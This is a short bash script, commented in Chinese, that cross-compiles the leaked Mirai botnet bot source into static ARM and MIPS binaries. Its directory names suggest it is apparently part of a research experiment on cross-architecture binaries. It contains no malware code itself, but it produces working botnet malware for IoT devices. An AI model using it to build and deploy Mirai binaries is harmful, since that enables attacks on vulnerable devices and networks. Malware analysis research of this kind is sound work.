#!/bin/bash

# 添加交叉編譯工具到 PATH
export PATH="$HOME/x-tools/arm-unknown-linux-gnueabi/bin:$HOME/x-tools/mips-unknown-linux-gnu/bin:$PATH"

# 設定編譯參數
COMMON_FLAGS="-O0 -fno-inline -fno-optimize-sibling-calls -fno-stack-protector -fno-exceptions -fcommon"
BOT_DIR="/home/tommy/cross-architecture/Experiment1/MIRAI/Mirai-Source-Code/mirai/bot"

# 編譯函數
compile_arch() {
    local arch=$1
    local compiler=$2
    local output_dir="output_${arch}"
    
    echo "Compiling for ${arch}..."
    mkdir -p ${output_dir}
    
    # 編譯所有源文件
    for src in ${BOT_DIR}/*.c; do
        echo "Compiling ${src}..."
        ${compiler} ${COMMON_FLAGS} -c ${src} -o ${output_dir}/$(basename ${src} .c).o
    done
    
    # 鏈接所有目標文件
    echo "Linking..."
    ${compiler} ${COMMON_FLAGS} -static ${output_dir}/*.o -o ${output_dir}/mirai.${arch} -lpthread
}

# 編譯 ARM 版本
compile_arch "arm" "arm-unknown-linux-gnueabi-gcc"

# 編譯 MIPS 版本
compile_arch "mips" "mips-unknown-linux-gnu-gcc"

# 驗證生成的檔案
echo "Verifying compiled files..."
if [ -f output_arm/mirai.arm ]; then
    file output_arm/mirai.arm
else
    echo "ARM binary not created"
fi

if [ -f output_mips/mirai.mips ]; then
    file output_mips/mirai.mips
else
    echo "MIPS binary not created"
fi